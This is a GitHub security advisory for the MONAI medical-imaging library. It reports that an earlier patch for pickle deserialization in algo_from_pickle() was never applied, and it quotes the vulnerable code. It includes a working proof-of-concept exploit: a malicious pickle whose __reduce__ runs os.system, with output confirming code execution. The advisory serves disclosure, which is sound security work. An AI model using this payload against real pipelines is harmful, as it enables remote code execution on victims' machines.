# [H] Incomplete Fix in MONAI: algo_from_pickle() pickle.loads() RCE still present in v1.5.2 despite GHSA-89gg-p5r5-q6r4 claiming      patch

## Summary
Severity: High
Advisory: GHSA-qxq5-qhx6-94qw
CWE: CWE-502
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-18
Source: https://github.com/advisories/GHSA-qxq5-qhx6-94qw
Type: github-advisory

## Affected
- PyPI: `monai` — affected >=0 <1.6.0

## Details
## Summary

  GHSA-89gg-p5r5-q6r4 claims the pickle deserialization vulnerability in
  `algo_from_pickle()` was fixed in v1.5.2. However, `monai/auto3dseg/utils.py`
  has not been modified since 2024-07-12 — 18 months before v1.5.2 was released
  (2026-01-29). All three `pickle.loads()` calls remain unchanged. The fix was
  never implemented.

  ## Vulnerable Code

  File: `monai/auto3dseg/utils.py` (last commit: 2024-07-12, unchanged in v1.5.2)

  ```python
  def algo_from_pickle(pkl_filename: str, ...):
      with open(pkl_filename, "rb") as f_pi:
          data_bytes = f_pi.read()
      data = pickle.loads(data_bytes)          # SINK 1 — line 321, RCE fires here

      # isinstance/key checks happen AFTER deserialization — already too late

      algo_bytes = data.pop("algo_bytes")
      ...
      if len(template_paths_candidates) == 0:
          algo = pickle.loads(algo_bytes)      # SINK 2 — line 350
      else:
          for p in template_paths_candidates:
              algo = pickle.loads(algo_bytes)  # SINK 3 — line 356

  No Unpickler subclass, no find_class restriction, no allowlist.

  Why the Fix is Incomplete

  - monai/auto3dseg/utils.py last commit: 2024-07-12 ("drop python 3.8")
  - v1.5.2 released: 2026-01-29 — release notes contain no pickle-related changes
  - v1.5.1 and v1.5.2 contain identical code at lines 321, 350, 356
  - GHSA-89gg-p5r5-q6r4 references a Zip Slip fix (unrelated) as the patch

  PoC

  import pickle, os

  class Exploit:
      def __reduce__(self):
          return (os.system, ('id > /tmp/rce_proof.txt',))

  # Craft malicious pkl
  data = {"algo_bytes": pickle.dumps(Exploit()), "template_path": None}
  with open("/tmp/evil.pkl", "wb") as f:
      f.write(pickle.dumps(data))

  # Trigger — monai/auto3dseg/utils.py lines 319-350 verbatim
  with open("/tmp/evil.pkl", "rb") as f:
      data = pickle.loads(f.read())        # SINK 1 fires — RCE here
  algo = pickle.loads(data["algo_bytes"])  # SINK 2 fires

  print(open("/tmp/rce_proof.txt").read())
  # uid=1000(user) gid=1000(user) groups=...

  Verified on monai v1.5.2 (utils.py verbatim source):
  [+] RCE CONFIRMED via algo_from_pickle():
      desktop-5657tb1\woong

  Impact

  Any application or ML pipeline calling algo_from_pickle() with an
  attacker-supplied file path is vulnerable to full RCE. Medical AI workflows
  frequently exchange model checkpoints, making this a realistic attack vector.

## References
- https://github.com/Project-MONAI/MONAI/security/advisories/GHSA-qxq5-qhx6-94qw
- https://github.com/Project-MONAI/MONAI
- https://github.com/Project-MONAI/MONAI/releases/tag/1.6.0
- https://github.com/advisories/GHSA-89gg-p5r5-q6r4
